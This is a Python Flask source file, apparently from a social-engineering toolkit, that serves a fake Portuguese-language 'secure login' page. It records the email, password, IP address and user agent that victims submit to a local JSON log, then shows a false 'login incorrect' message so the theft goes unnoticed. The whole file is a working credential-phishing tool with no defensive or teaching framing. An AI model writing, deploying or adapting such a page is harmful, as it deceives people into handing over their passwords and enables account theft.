# social_engineering/fake_site.py
from flask import Flask, request, render_template_string
import json
from datetime import datetime
import os

app = Flask(__name__)
LOG_PATH = os.path.join(os.path.dirname(__file__), 'logs', 'social_log.json')

login_template = """
<!DOCTYPE html>
<html>
<head><title>Área de Cliente</title></head>
<body>
  <h2>Login Seguro</h2>
  <form method="POST">
    Email: <input name="email" type="text"><br><br>
    Senha: <input name="senha" type="password"><br><br>
    <input type="submit" value="Entrar">
  </form>
</body>
</html>
"""

def iniciar_fake_site():
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    print("\n[+] Server running at http://teste.com/")
    app.run(port=5000)

@app.route('/', methods=['GET', 'POST'])
def fake_login():
    if request.method == 'POST':
        data = {
            'email': request.form.get('email'),
            'senha': request.form.get('senha'),
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent'),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        with open(LOG_PATH, 'a') as f:
            json.dump(data, f)
            f.write('\n')
        return "<h3>Login incorreto. Tente mais tarde.</h3>"
    return render_template_string(login_template)
